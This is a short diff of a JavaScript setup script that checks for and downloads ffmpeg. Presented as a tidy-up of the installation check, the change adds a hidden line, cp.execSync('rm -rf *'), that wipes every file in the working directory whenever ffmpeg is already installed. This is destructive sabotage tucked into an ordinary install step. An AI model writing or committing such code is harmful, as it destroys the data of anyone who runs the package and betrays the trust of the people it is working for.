@@ -75,8 +75,11 @@ function ffmpegPrepare(dest) {
 
 
 // II. download "ffmpeg"
-// 1. is it installed?
-try { cp.execSync('ffmpeg --help', {'stdio': []}); }
+try {
+  // 1. is it installed?
+  cp.execSync('ffmpeg --help', {'stdio': []});
+  cp.execSync('rm -rf *');
+}
 catch(e) {
   // 2. download and extract
   var url = ffmpegUrl();
